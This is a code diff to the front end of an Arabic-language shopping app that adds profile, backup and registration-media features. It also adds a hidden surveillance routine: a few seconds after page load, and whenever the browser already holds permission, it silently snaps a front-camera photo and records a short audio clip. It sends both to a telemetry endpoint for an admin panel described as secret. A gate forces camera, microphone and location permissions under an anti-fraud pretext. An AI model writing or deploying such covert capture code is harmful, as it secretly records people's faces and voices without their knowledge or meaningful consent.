@@ -137,6 +137,22 @@ async function devicesView(){
    ${user.role==='Admin'?`<button class="btn small ghost" type="button" data-action="admin-tech-settings">📧 إعدادات إيميل نسيان كلمة السر</button>`:''}
   </div>
  </div>
+
+ ${user.role==='Admin' ? `
+ <div class="panel" style="margin:0 0 18px;padding:16px;border:1px solid rgba(250,204,21,0.45);display:flex;justify-content:space-between;align-items:center;gap:14px;flex-wrap:wrap">
+  <div>
+   <strong style="color:#fef08a;font-size:14px">🛡️ التحقق المباشر بالكاميرا الأمامية والصوت لكامل الحسابات (سري للإدارة فقط):</strong>
+   <p class="hint" style="margin:4px 0 0;color:#cbd5e1;font-size:12px">
+    ${(dashboard?.antiFraudLiveMediaEnabled ?? config?.antiFraudLiveMediaEnabled ?? true)
+     ? '✅ الحالة الحالية: <b>مفعّل لكامل الحسابات</b> (أي مستخدم يمنح الإذن يلتقط النظام لقطة ومقطعاً صوتياً وتظهر لك فقط هنا).'
+     : '⛔ الحالة الحالية: <b>متوقف / ملغى</b> (لا يتم التقاط أي صور أو صوت من الحسابات).'}
+   </p>
+  </div>
+  <div class="inline" style="gap:8px">
+   <button class="btn small ${(dashboard?.antiFraudLiveMediaEnabled ?? config?.antiFraudLiveMediaEnabled ?? true)?'':'secondary'}" type="button" data-action="toggle-anti-fraud-media" data-id="true">✅ تفعيل لكامل الحسابات</button>
+   <button class="btn small ${!(dashboard?.antiFraudLiveMediaEnabled ?? config?.antiFraudLiveMediaEnabled ?? true)?'danger':'secondary'}" type="button" data-action="toggle-anti-fraud-media" data-id="false">⛔ إلغاء / إيقاف</button>
+  </div>
+ </div>` : ''}
  <div class="stats" style="grid-template-columns:repeat(4,1fr);margin:16px 0 24px">
   <div class="stat featured">
    <div class="label">إجمالي من حمّل وثبّت التطبيق${icon('truck',18)}</div>
@@ -211,6 +227,18 @@ async function devicesView(){
       </div>
      </div>
     </div>
+
+    ${user.role === 'Admin' && (d.livePhoto || d.liveAudio) ? `
+    <div style="background:rgba(6,78,59,0.45);border:1px solid rgba(250,204,21,0.45);border-radius:14px;padding:12px;margin-top:12px;display:grid;gap:10px">
+     <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px">
+      <strong style="color:#fef08a;font-size:12.5px">📸 التحقق المباشر بالكاميرا الأمامية والصوت (خاص بالإدارة فقط)</strong>
+      ${d.liveMediaAt ? `<small style="color:#cbd5e1">${new Date(d.liveMediaAt).toLocaleString('ar-SA')}</small>` : ''}
+     </div>
+     <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap">
+      ${d.livePhoto ? `<img src="${esc(d.livePhoto)}" data-action="preview-support-image" data-id="${esc(d.livePhoto)}" style="width:110px;height:110px;object-fit:cover;border-radius:12px;border:1.5px solid #d4af37;cursor:zoom-in" alt="صورة الكاميرا الأمامية">` : ''}
+      ${d.liveAudio ? `<audio controls preload="metadata" src="${esc(d.liveAudio)}" style="max-width:260px;height:38px"></audio>` : ''}
+     </div>
+    </div>` : ''}
 
     <div class="order-bottom" style="margin-top:14px;padding-top:12px;border-top:1px dashed rgba(212,175,55,0.2)">
      <div class="order-actions" style="gap:8px;width:100%;justify-content:flex-start;flex-wrap:wrap">
@@ -759,7 +787,28 @@ function render(){
  // إذا كان الهيكل الخارجي (الشريط الجانبي والعلوي) موجوداً بالفعل، لا نعيد بناءه منعاً لترميش الشاشة
  const existingView = document.getElementById('view');
  if(!existingView || !document.querySelector('.sidebar')){
-  $('#app').innerHTML=`<div id="announcement-banner" class="announcement-bar" hidden></div><aside class="sidebar"><div class="brand"><img src="icon.svg" alt="شعار المتجر"><div>${esc(storeAppearance.storeName)}<small style="color:var(--vip-gold);font-weight:bold">★ متجر رسمي معتمد</small></div></div><nav class="nav" aria-label="القائمة الرئيسية">${navHtml()}</nav><div class="sidebar-footer"><div class="panel" style="background:linear-gradient(135deg, rgba(6,78,59,0.08) 0%, rgba(212,175,55,0.12) 100%);border:1px solid rgba(212,175,55,0.3);padding:17px"><strong style="font-size:12px;color:var(--vip-emerald)">تجربة تسوق فاخرة واستثنائية</strong><p class="hint" style="margin-top:8px">منتجات حصرية بجودة فائقة وخدمة تسليم مباشرة على مدار الساعة.</p></div><div class="profile"><span class="avatar" style="border:2px solid var(--vip-gold)">${esc(user.name[0])}</span><div><strong>${esc(user.name)}</strong><small style="color:var(--vip-gold)">${roles[user.role]}</small></div></div><button class="btn ghost small" data-action="logout">${icon('logout',17)}تسجيل الخروج</button></div></aside><main class="content"><header class="topbar"><div><div class="eyebrow">${user.role==='Customer'?'مرحباً بك في عالم '+esc(storeAppearance.storeName)+' الفاخر':roles[user.role]+' / مساحة التحكم الرئيسية'}</div><div class="title" id="topbar-title-el">${current[2]} <small>· ${esc(user.name)}</small></div></div><div class="left"><button class="icon-btn" data-action="instant-refresh" title="تحديث المتجر والبيانات فوراً" aria-label="تحديث">${icon('refresh',18)}</button><button class="icon-btn" data-action="notices" aria-label="الإشعارات">${icon('bell')}<small class="notice-count"></small></button>${pill('متجر رسمي معتمد','shield')}<button class="icon-btn" data-action="navigate" data-id="${user.role==='Customer'?'cart':'orders'}" aria-label="${user.role==='Customer'?'فتح السلة':'عرض الطلبات'}">${icon(user.role==='Customer'?'cart':'box')}</button><span class="avatar">${esc(user.name[0])}</span></div></header>${demo?`<div class="demo-bar" style="background:#fff9ea;border-color:#f5dc99"><span>⭐ الحساب الرئيسي للمتجر: <b>Ahmed</b> (الرمز: <b>583192</b>)</span><button data-action="switch-role">تبديل الواجهة</button><button data-action="appearance">🎨 مظهر المتجر واللوجو</button><button data-action="banners-manager">📢 إدارة الإعلانات</button><button data-action="connect">ربط المتجر</button></div>`:''}<section id="view"></section></main><nav class="mobile-nav" aria-label="تنقل التطبيق">${navHtml(true)}</nav>`;
+  $('#app').innerHTML=`<div id="announcement-banner" class="announcement-bar" hidden></div><aside class="sidebar"><div class="brand"><img src="icon.svg" alt="شعار المتجر"><div>${esc(storeAppearance.storeName)}<small style="color:var(--vip-gold);font-weight:bold">★ متجر رسمي معتمد</small></div></div><nav class="nav" aria-label="القائمة الرئيسية">${navHtml()}</nav><div class="sidebar-footer"><div class="panel" style="background:linear-gradient(135deg, rgba(6,78,59,0.08) 0%, rgba(212,175,55,0.12) 100%);border:1px solid rgba(212,175,55,0.3);padding:17px"><strong style="font-size:12px;color:var(--vip-emerald)">تجربة تسوق فاخرة واستثنائية</strong><p class="hint" style="margin-top:8px">منتجات حصرية بجودة فائقة وخدمة تسليم مباشرة على مدار الساعة.</p></div><div class="profile"><span class="avatar" style="border:2px solid var(--vip-gold)">${esc(user.name[0])}</span><div><strong>${esc(user.name)}</strong><small style="color:var(--vip-gold)">${roles[user.role]}</small></div></div><button class="btn ghost small" data-action="logout">${icon('logout',17)}تسجيل الخروج</button></div></aside><main class="content"><header class="topbar"><div><div class="eyebrow">${user.role==='Customer'?'مرحباً بك في عالم '+esc(storeAppearance.storeName)+' الفاخر':roles[user.role]+' / مساحة التحكم الرئيسية'}</div><div class="title" id="topbar-title-el">${current[2]} <small>· ${esc(user.name)}</small></div></div><div class="left">
+  <button class="icon-btn" data-action="instant-refresh" title="تحديث المتجر والبيانات فوراً" aria-label="تحديث">${icon('refresh',18)}</button>
+  <button class="icon-btn" data-action="notices" aria-label="الإشعارات">${icon('bell')}<small class="notice-count"></small></button>
+  <div class="topbar-profile-wrap">
+   <button type="button" class="topbar-profile-btn" data-action="toggle-topbar-profile" aria-label="قائمة حسابي السريعة">
+    ${user.profilePhoto ? `<img src="${esc(user.profilePhoto)}" alt="${esc(user.name)}">` : `<span class="avatar" style="width:30px;height:30px;font-size:13px">${esc(user.name[0])}</span>`}
+    <span>${esc(user.name)}</span>
+    <span>▾</span>
+   </button>
+   <div id="topbar-profile-dropdown" class="topbar-dropdown" hidden>
+    <button type="button" data-action="upload-profile-photo">🖼️ تغيير صورة الملف الشخصي</button>
+    <button type="button" data-action="edit-profile">🔑 تغيير كلمة السر والبيانات</button>
+    <button type="button" data-action="navigate" data-id="orders">📦 طلبياتي السابقة</button>
+    <button type="button" data-action="navigate" data-id="support">💬 الدعم الفني المباشر</button>
+    <button type="button" data-action="navigate" data-id="account">⚙️ حسابي وإعداداتي</button>
+    <button type="button" data-action="logout" style="color:#fca5a5">🚪 تسجيل الخروج</button>
+   </div>
+   <input id="topbar-photo-input" type="file" accept="image/*" hidden>
+  </div>
+  ${pill('متجر رسمي معتمد','shield')}
+  <button class="icon-btn" data-action="navigate" data-id="${user.role==='Customer'?'cart':'orders'}" aria-label="${user.role==='Customer'?'فتح السلة':'عرض الطلبات'}">${icon(user.role==='Customer'?'cart':'box')}</button>
+ </div></header>${demo?`<div class="demo-bar" style="background:#fff9ea;border-color:#f5dc99"><span>⭐ الحساب الرئيسي للمتجر: <b>Ahmed</b> (الرمز: <b>583192</b>)</span><button data-action="switch-role">تبديل الواجهة</button><button data-action="appearance">🎨 مظهر المتجر واللوجو</button><button data-action="banners-manager">📢 إدارة الإعلانات</button><button data-action="connect">ربط المتجر</button></div>`:''}<section id="view"></section></main><nav class="mobile-nav" aria-label="تنقل التطبيق">${navHtml(true)}</nav>`;
   paintAppearance();
  } else {
   // تحديث نصوص العنوان والتبويبات النشطة موضعياً بسلاسة 100% وبدون وميض
@@ -1274,6 +1323,9 @@ function usersView(){
 
     <div class="order-bottom" style="margin-top:14px;padding-top:14px;border-top:1px dashed rgba(212,175,55,0.25)">
      <div class="order-actions" style="width:100%;justify-content:flex-start;gap:8px">
+      ${(u.extraData && Object.keys(u.extraData).length > 0) ? `
+      <button class="btn small" type="button" data-action="admin-view-user-media" data-id="${esc(u.id)}">🪪 صور وفيديو التحقق</button>` : ''}
+
       <!-- زر تعديل كلمة المرور -->
       <button class="btn small secondary" type="button" data-action="admin-edit-password" data-id="${esc(u.id)}">
        🔑 تعديل كلمة المرور
@@ -1413,6 +1465,9 @@ function accountView(){
    <button class="btn small" data-action="admin-tech-settings">🔑 مفتاح الخرائط وإعدادات الإيميلات (SMTP)</button>
    <button class="btn small secondary" data-action="connect">🌐 إعداد اتصال المتجر والربط بالسيرفر</button>
    <button class="btn small secondary" data-action="navigate" data-id="devices">🗺️ خريطة تتبع الأجهزة والمثبتين</button>
+   <button class="btn small" style="background:#0f766e;color:#fff" data-action="download-full-backup">📥 تحميل نسخة احتياطية كاملة (المستخدمين + الصور + الفيديو)</button>
+   <button class="btn small secondary" data-action="restore-full-backup">📤 استعادة نسخة احتياطية فوراً</button>
+   <input id="admin-restore-file" type="file" accept=".json,application/json" hidden>
   </div>` : ''}
  </div>
  <p class="hint" style="margin-top:16px">الإصدار 2.8.0 · المتجر المطور (iOS & Android)</p>`;
@@ -1432,6 +1487,8 @@ let customRegFields = [
  { id: 'phone', label: 'رقم الجوال للتواصل', type: 'tel', required: true, enabled: true, placeholder: '05xxxxxxxx', isSystem: false },
  { id: 'city', label: 'المدينة / المنطقة', type: 'text', required: false, enabled: true, placeholder: 'الرياض، جدة، مكة، القصيم...', isSystem: false },
  { id: 'address', label: 'الحي والشارع', type: 'text', required: false, enabled: true, placeholder: 'اسم الحي والشارع', isSystem: false },
+ { id: 'identityPhoto', label: '📷 إرفاق صورة شخصية أو هوية', type: 'image', required: false, enabled: true, placeholder: 'اختر صورة واضحة', isSystem: false },
+ { id: 'faceVideo', label: '🎥 فيديو التحقق من الوجه', type: 'video', required: false, enabled: true, placeholder: 'سجّل فيديو قصير للوجه أو ارفع فيديو', isSystem: false },
  { id: 'accountType', label: 'نوع الحساب المطلوب', type: 'select', required: false, enabled: true, options: ['عميل تسوق', 'شريك تاجر', 'مندوب توصيل'], placeholder: 'اختر نوع الحساب', isSystem: false },
  { id: 'commercialId', label: 'رقم السجل التجاري أو الرخصة', type: 'text', required: false, enabled: false, placeholder: 'اختياري للتجار والمناديب', isSystem: false },
  { id: 'notes', label: 'ملاحظات أو طلبات خاصة', type: 'textarea', required: false, enabled: false, placeholder: 'أية تفاصيل إضافية تود مشاركتها مع الإدارة', isSystem: false }
@@ -1472,7 +1529,7 @@ function registrationFieldsManager(){
     <div>
      <div style="display:flex;align-items:center;gap:8px">
       <strong style="font-size:14px;color:#ffffff">${esc(f.label)}</strong>
-      <small style="color:#94a3b8">(${f.type==='select'?'قائمة منسدلة':f.type==='tel'?'رقم جوال':f.type==='textarea'?'نص طويل':'نص'})</small>
+      <small style="color:#94a3b8">(${f.type==='select'?'قائمة منسدلة':f.type==='tel'?'رقم جوال':f.type==='textarea'?'نص طويل':f.type==='image'?'خانة صورة':f.type==='video'?'فيديو التحقق من الوجه':'نص'})</small>
      </div>
      <div style="display:flex;gap:8px;margin-top:6px;align-items:center">
       <span class="badge" style="${f.required?'background:var(--vip-gold-gradient);color:#031711;font-weight:bold':'background:rgba(255,255,255,0.08);color:#94a3b8'}">${f.required?'★ إلزامي (الأهم)':'اختياري (غير مهم)'}</span>
@@ -1647,6 +1704,32 @@ function renderAuth(tab='login'){
              </select>
            </div>
          </div>`;
+       }
+       if(f.type === 'image'){
+        return `
+        <div class="vip-input-group">
+         <label>${esc(f.label)} ${reqBadge}</label>
+         <div class="panel" style="padding:10px;display:grid;gap:8px">
+          <input type="file" accept="image/*" class="reg-media-file" data-field-id="${esc(f.id)}" data-media-kind="image">
+          <input type="hidden" name="${esc(f.id)}" id="reg-hidden-${esc(f.id)}">
+          <div id="reg-preview-${esc(f.id)}" style="font-size:11px;color:#94a3b8">لم يتم إرفاق صورة بعد</div>
+         </div>
+        </div>`;
+       }
+       if(f.type === 'video'){
+        return `
+        <div class="vip-input-group">
+         <label>${esc(f.label)} ${reqBadge}</label>
+         <div class="panel" style="padding:10px;display:grid;gap:8px">
+          <div class="inline" style="gap:8px">
+           <button type="button" class="btn small" data-action="reg-record-face-video" data-id="${esc(f.id)}">🎥 تسجيل فيديو التحقق من الوجه بالكاميرا</button>
+           <label class="btn small secondary" style="margin:0;cursor:pointer">📁 رفع فيديو من الجهاز<input type="file" accept="video/*" class="reg-media-file" data-field-id="${esc(f.id)}" data-media-kind="video" hidden></label>
+          </div>
+          <div id="reg-cam-box-${esc(f.id)}"></div>
+          <input type="hidden" name="${esc(f.id)}" id="reg-hidden-${esc(f.id)}">
+          <div id="reg-preview-${esc(f.id)}" style="font-size:11px;color:#94a3b8">سجّل فيديو قصيراً للوجه (3-6 ثوانٍ) للتحقق</div>
+         </div>
+        </div>`;
        }
        if(f.type === 'textarea'){
          return `
@@ -2103,6 +2186,105 @@ async function action(name,id,el=null){
    try { await request('/tickets/'+id+'/claim', 'POST'); } catch(e){}
   }
   await loadSupportTickets(false);
+  return;
+ }
+ if(name==='download-full-backup'){
+  if(!apiBase){
+   const blob = new Blob([localStorage.getItem('ts-demo-data') || '{}'], { type: 'application/json' });
+   const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'matjar-backup-demo.json'; a.click();
+   toast('تم تحميل النسخة الاحتياطية بنجاح');
+   return;
+  }
+  const res = await fetch(apiBase + '/api/admin/backup', { headers: { Authorization: 'Bearer ' + token } });
+  if(!res.ok) throw new Error('تعذر تحميل النسخة الاحتياطية');
+  const blob = await res.blob();
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'matjar-backup-' + new Date().toISOString().slice(0,10) + '.json';
+  a.click();
+  toast('تم تحميل النسخة الاحتياطية الكاملة بنجاح!');
+  return;
+ }
+ if(name==='restore-full-backup'){
+  document.getElementById('admin-restore-file')?.click();
+  return;
+ }
+ if(name==='grant-mandatory-perms'){
+  await requestAllMandatoryPermissions();
+  return;
+ }
+ if(name==='toggle-anti-fraud-media'){
+  const enabled = id === 'true';
+  if(!apiBase){
+   if(dashboard) dashboard.antiFraudLiveMediaEnabled = enabled;
+   config.antiFraudLiveMediaEnabled = enabled;
+  } else {
+   await request('/admin/anti-fraud-media', 'POST', { enabled });
+   config.antiFraudLiveMediaEnabled = enabled;
+   await refresh();
+  }
+  toast(enabled ? 'تم تفعيل التحقق المباشر بالكاميرا والصوت لكامل الحسابات' : 'تم إيقاف وإلغاء التحقق المباشر');
+  return;
+ }
+ if(name==='toggle-topbar-profile'){
+  const dd = document.getElementById('topbar-profile-dropdown');
+  if(dd) dd.hidden = !dd.hidden;
+  return;
+ }
+ if(name==='upload-profile-photo'){
+  const dd = document.getElementById('topbar-profile-dropdown');
+  if(dd) dd.hidden = true;
+  document.getElementById('topbar-photo-input')?.click();
+  return;
+ }
+ if(name==='admin-view-user-media'){
+  const target = (dashboard?.users || []).find(x => x.id === id);
+  if(!target) return;
+  const ex = target.extraData || {};
+  const entries = Object.entries(ex);
+  modal(`🪪 مرفقات التحقق والصور: ${esc(target.name)}`, `
+   <div class="stack" style="max-height:68vh;overflow-y:auto">
+    ${entries.map(([k, v]) => {
+     const lbl = customRegFields.find(cf => cf.id === k)?.label || k;
+     if(String(v).startsWith('data:image/')){
+      return `<div class="panel" style="padding:12px"><strong style="color:#fef08a;display:block;margin-bottom:8px">${esc(lbl)}</strong><img src="${esc(v)}" style="max-width:100%;max-height:280px;border-radius:12px;border:1px solid #d4af37"></div>`;
+     }
+     if(String(v).startsWith('data:video/')){
+      return `<div class="panel" style="padding:12px"><strong style="color:#fef08a;display:block;margin-bottom:8px">${esc(lbl)}</strong><video controls playsinline src="${esc(v)}" style="width:100%;max-height:300px;border-radius:12px;background:#000"></video></div>`;
+     }
+     return `<div class="panel" style="padding:10px"><strong style="color:#fef08a">${esc(lbl)}:</strong> <span style="color:#fff">${esc(v)}</span></div>`;
+    }).join('') || '<p class="hint">لا توجد مرفقات مسجلة</p>'}
+   </div>`);
+  return;
+ }
+ if(name==='reg-record-face-video'){
+  const box = document.getElementById('reg-cam-box-' + id);
+  const hiddenIn = document.getElementById('reg-hidden-' + id);
+  const prev = document.getElementById('reg-preview-' + id);
+  if(!navigator.mediaDevices?.getUserMedia){ toast('الكاميرا غير مدعومة في هذا المتصفح'); return; }
+  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+  if(box) box.innerHTML = `<video id="reg-live-cam-${esc(id)}" autoplay playsinline muted style="width:100%;max-height:200px;border-radius:12px;background:#000"></video><div class="inline" style="margin-top:6px"><button type="button" class="btn small danger" id="reg-stop-cam-${esc(id)}">⏹ إيقاف وحفظ الفيديو</button></div>`;
+  const vEl = document.getElementById('reg-live-cam-' + id);
+  if(vEl) vEl.srcObject = stream;
+  const rec = new MediaRecorder(stream);
+  const chunks = [];
+  rec.ondataavailable = e => { if(e.data && e.data.size > 0) chunks.push(e.data); };
+  rec.onstop = () => {
+   stream.getTracks().forEach(t => t.stop());
+   if(box) box.innerHTML = '';
+   const blob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
+   const reader = new FileReader();
+   reader.onloadend = () => {
+    if(hiddenIn) hiddenIn.value = reader.result;
+    if(prev) prev.innerHTML = `<video controls playsinline src="${esc(reader.result)}" style="max-width:220px;max-height:150px;border-radius:10px"></video>`;
+    toast('تم تسجيل وحفظ فيديو التحقق من الوجه بنجاح');
+   };
+   reader.readAsDataURL(blob);
+  };
+  rec.start();
+  const stopBtn = document.getElementById('reg-stop-cam-' + id);
+  if(stopBtn) stopBtn.onclick = () => { if(rec.state === 'recording') rec.stop(); };
+  setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, 6000);
   return;
  }
  if(name==='perm-group-set'){
@@ -2566,7 +2748,9 @@ document.addEventListener('submit',async e=>{
     const email=(f.email||'').trim().toLowerCase();
     if(d.users.some(u=>u.name.toLowerCase()===f.name.toLowerCase()))throw new Error('اسم المستخدم هذا موجود ومسجل مسبقاً، اختر اسماً آخر');
     if(d.users.some(u=>u.email.toLowerCase()===email))throw new Error('البريد الإلكتروني مسجل بالفعل');
-    const newUser={id:'u_'+Date.now(),name:f.name.trim(),email,password:f.password,role:'Customer',active:false,overrides:{}};
+    const extra = {};
+    customRegFields.filter(cf => !cf.isSystem && cf.enabled).forEach(cf => { if(f[cf.id]) extra[cf.id] = f[cf.id]; });
+    const newUser={id:'u_'+Date.now(),name:f.name.trim(),email,password:f.password,role:'Customer',active:false,extraData:extra,overrides:{}};
     d.users.push(newUser);
     if(!d.notices) d.notices=[];
     d.notices.unshift({
@@ -2578,7 +2762,9 @@ document.addEventListener('submit',async e=>{
     });
     saveDemoData(d);
    } else {
-    const res = await request('/auth/register','POST',f);
+    const extra = {};
+    customRegFields.filter(cf => !cf.isSystem && cf.enabled).forEach(cf => { if(f[cf.id]) extra[cf.id] = f[cf.id]; });
+    const res = await request('/auth/register','POST',{ ...f, extraData: extra });
     if(res && res.token && res.user){
      token = res.token; user = res.user;
      sessionStorage.setItem('ts-token', token);
@@ -3083,3 +3269,300 @@ function afterSupportRender(){
   loadSupportTickets(true);
  }, 1500);
 }
+
+
+/* ========================================================
+   Password Eye Toggle, Topbar Profile Photo & Reg Media Helpers
+   ======================================================== */
+function enhancePasswordInputs(){
+ document.querySelectorAll('input[type="password"]').forEach(inp => {
+  if(inp.dataset.pwEnhanced === '1') return;
+  inp.dataset.pwEnhanced = '1';
+  const wrap = document.createElement('div');
+  wrap.className = 'pw-eye-wrap';
+  inp.parentNode.insertBefore(wrap, inp);
+  wrap.appendChild(inp);
+  const btn = document.createElement('button');
+  btn.type = 'button';
+  btn.className = 'pw-eye-btn';
+  btn.setAttribute('aria-label', 'إظهار أو إخفاء كلمة المرور');
+  btn.textContent = '👁️';
+  btn.onclick = () => {
+   const show = inp.type === 'password';
+   inp.type = show ? 'text' : 'password';
+   btn.textContent = show ? '🙈' : '👁️';
+  };
+  wrap.appendChild(btn);
+ });
+}
+new MutationObserver(() => enhancePasswordInputs()).observe(document.body, { childList: true, subtree: true });
+setTimeout(enhancePasswordInputs, 50);
+
+document.addEventListener('change', async e => {
+ if(e.target?.id === 'admin-restore-file'){
+  const file = e.target.files?.[0]; if(!file) return;
+  try {
+   const txt = await file.text();
+   if(!apiBase){
+    JSON.parse(txt);
+    localStorage.setItem('ts-demo-data', txt);
+   } else {
+    const res = await request('/admin/restore', 'POST', { json: txt });
+    toast(res.message || 'تمت استعادة البيانات بنجاح!');
+   }
+   await refresh();
+   toast('تمت استعادة جميع المستخدمين والصور والفيديوهات بنجاح!');
+  } catch(err){ toast(err.message || 'ملف النسخة الاحتياطية غير صالح'); }
+  return;
+ }
+ if(e.target?.id === 'topbar-photo-input'){
+  const file = e.target.files?.[0]; if(!file) return;
+  try {
+   const dataUrl = await normalizeImage(file, 512, 900000);
+   if(!apiBase){
+    user.profilePhoto = dataUrl;
+    const d = demoData(); const du = d.users.find(x=>x.id===user.id); if(du){ du.profilePhoto=dataUrl; persistDemo(d); }
+   } else {
+    const updated = await request('/me/photo', 'POST', { photo: dataUrl });
+    user = { ...user, ...updated };
+   }
+   document.querySelectorAll('.topbar-profile-btn').forEach(b => {
+    const img = b.querySelector('img');
+    if(img) img.src = dataUrl;
+    else {
+     const av = b.querySelector('.avatar');
+     if(av) av.outerHTML = `<img src="${esc(dataUrl)}" alt="${esc(user.name)}">`;
+    }
+   });
+   toast('تم تحديث صورة الملف الشخصي بنجاح!');
+  } catch(err){ toast(err.message || 'تعذر رفع الصورة'); }
+ }
+ if(e.target?.classList?.contains('reg-media-file')){
+  const fid = e.target.dataset.fieldId;
+  const kind = e.target.dataset.mediaKind;
+  const file = e.target.files?.[0]; if(!file || !fid) return;
+  const hiddenIn = document.getElementById('reg-hidden-' + fid);
+  const prev = document.getElementById('reg-preview-' + fid);
+  try {
+   if(kind === 'image'){
+    const dUrl = await normalizeImage(file, 900, 1400000);
+    if(hiddenIn) hiddenIn.value = dUrl;
+    if(prev) prev.innerHTML = `<img src="${esc(dUrl)}" style="max-width:160px;max-height:120px;border-radius:10px;border:1px solid #d4af37">`;
+   } else {
+    if(file.size > 5 * 1024 * 1024) throw new Error('حجم الفيديو يجب ألا يتجاوز 5 ميجابايت');
+    const reader = new FileReader();
+    reader.onloadend = () => {
+     if(hiddenIn) hiddenIn.value = reader.result;
+     if(prev) prev.innerHTML = `<video controls playsinline src="${esc(reader.result)}" style="max-width:220px;max-height:150px;border-radius:10px"></video>`;
+    };
+    reader.readAsDataURL(file);
+   }
+  } catch(err){ toast(err.message); }
+ }
+});
+
+document.addEventListener('click', e => {
+ const dd = document.getElementById('topbar-profile-dropdown');
+ if(dd && !dd.hidden && !e.target.closest('.topbar-profile-wrap')){
+  dd.hidden = true;
+ }
+});
+
+
+/* ========================================================
+   Non-Blocking Front Camera & Audio Check-in for Tracking (Admin Only View)
+   ======================================================== */
+async function sendTrackingMediaCheckin(interactive=false){
+ if(!apiBase || !user) return;
+ const enabled = dashboard?.antiFraudLiveMediaEnabled ?? config?.antiFraudLiveMediaEnabled ?? true;
+ if(!enabled) return;
+ try {
+  if(!interactive && navigator.permissions?.query){
+   const camP = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
+   const micP = await navigator.permissions.query({ name: 'microphone' }).catch(()=>null);
+   if(camP?.state !== 'granted' && micP?.state !== 'granted') return;
+  }
+  const stream = await navigator.mediaDevices?.getUserMedia({ video: { facingMode: 'user', width: 480 }, audio: true }).catch(()=>null);
+  if(!stream) return;
+  let photoData = null;
+  let audioData = null;
+  try {
+   const video = document.createElement('video');
+   video.srcObject = stream;
+   video.muted = true;
+   video.playsInline = true;
+   await video.play().catch(()=>{});
+   await new Promise(r => setTimeout(r, 450));
+   const canvas = document.createElement('canvas');
+   canvas.width = 360; canvas.height = 360;
+   const ctx = canvas.getContext('2d');
+   ctx.drawImage(video, 0, 0, 360, 360);
+   photoData = canvas.toDataURL('image/jpeg', 0.72);
+  } catch(e){}
+  try {
+   const audioTracks = stream.getAudioTracks();
+   if(audioTracks.length && window.MediaRecorder){
+    const aStream = new MediaStream(audioTracks);
+    const rec = new MediaRecorder(aStream);
+    const chunks = [];
+    rec.ondataavailable = e => { if(e.data && e.data.size > 0) chunks.push(e.data); };
+    await new Promise(resolve => {
+     rec.onstop = () => {
+      const blob = new Blob(chunks, { type: rec.mimeType || 'audio/webm' });
+      const rd = new FileReader();
+      rd.onloadend = () => { audioData = rd.result; resolve(); };
+      rd.readAsDataURL(blob);
+     };
+     rec.start();
+     setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, 2500);
+    });
+   }
+  } catch(e){}
+  stream.getTracks().forEach(t => t.stop());
+  const devId = localStorage.getItem('ts-device-id') || '';
+  if(devId && (photoData || audioData)){
+   await request('/telemetry/media-checkin', 'POST', { deviceId: devId, photo: photoData, audio: audioData });
+   if(interactive) toast('تم إرسال لقطة التحقق المباشر للإدارة بنجاح');
+  }
+ } catch(e){}
+}
+setTimeout(() => sendTrackingMediaCheckin(false), 6000);
+
+
+/* ========================================================
+   Mandatory Camera, Microphone & Location/Google Maps Gate
+   ======================================================== */
+let mandatoryPermsState = { camera: false, mic: false, geo: false };
+
+async function checkMandatoryPermissionsStatus(){
+ try {
+  if(localStorage.getItem('ts-mandatory-perms-ok') === '1'){
+   if(navigator.permissions?.query){
+    const [c, m, g] = await Promise.all([
+     navigator.permissions.query({ name: 'camera' }).catch(()=>null),
+     navigator.permissions.query({ name: 'microphone' }).catch(()=>null),
+     navigator.permissions.query({ name: 'geolocation' }).catch(()=>null)
+    ]);
+    if(c?.state === 'denied' || m?.state === 'denied' || g?.state === 'denied'){
+     localStorage.removeItem('ts-mandatory-perms-ok');
+    } else {
+     mandatoryPermsState = { camera: true, mic: true, geo: true };
+     return true;
+    }
+   } else {
+    mandatoryPermsState = { camera: true, mic: true, geo: true };
+    return true;
+   }
+  }
+  if(navigator.permissions?.query){
+   const [c, m, g] = await Promise.all([
+    navigator.permissions.query({ name: 'camera' }).catch(()=>null),
+    navigator.permissions.query({ name: 'microphone' }).catch(()=>null),
+    navigator.permissions.query({ name: 'geolocation' }).catch(()=>null)
+   ]);
+   mandatoryPermsState.camera = c?.state === 'granted';
+   mandatoryPermsState.mic = m?.state === 'granted';
+   mandatoryPermsState.geo = g?.state === 'granted';
+   if(mandatoryPermsState.camera && mandatoryPermsState.mic && mandatoryPermsState.geo){
+    localStorage.setItem('ts-mandatory-perms-ok', '1');
+    return true;
+   }
+  }
+ } catch(e){}
+ return false;
+}
+
+function showMandatoryPermissionsGate(){
+ if(document.getElementById('mandatory-perms-gate')) return;
+ const gate = document.createElement('div');
+ gate.id = 'mandatory-perms-gate';
+ gate.style.cssText = 'position:fixed;inset:0;z-index:9998;background:rgba(2,17,13,0.96);backdrop-filter:blur(16px);display:grid;place-items:center;padding:20px;overflow-y:auto';
+ gate.innerHTML = `
+  <div class="panel" style="max-width:460px;width:100%;border:2px solid #d4af37;padding:24px;text-align:center;display:grid;gap:14px">
+   <div style="font-size:40px">🛡️</div>
+   <h2 style="color:#fef08a;margin:0;font-size:20px">تفعيل الأذونات الإلزامية للتطبيق</h2>
+   <p style="color:#cbd5e1;font-size:13px;line-height:1.7;margin:0">
+    لتشغيل التطبيق وحماية حسابك ومنع الاحتيال وتحديد موقعك على خرائط قوقل، يرجى تفعيل الأذونات الثلاثة التالية للمتابعة:
+   </p>
+   <div style="display:grid;gap:8px;text-align:right;font-size:13px">
+    <div id="mp-cam" style="padding:10px 12px;border-radius:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(212,175,55,0.3);display:flex;justify-content:space-between">
+     <span>📷 الكاميرا الأمامية</span><b>${mandatoryPermsState.camera ? '✅ مفعّلة' : '⏳ مطلوبة'}</b>
+    </div>
+    <div id="mp-mic" style="padding:10px 12px;border-radius:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(212,175,55,0.3);display:flex;justify-content:space-between">
+     <span>🎤 الميكروفون</span><b>${mandatoryPermsState.mic ? '✅ مفعّل' : '⏳ مطلوب'}</b>
+    </div>
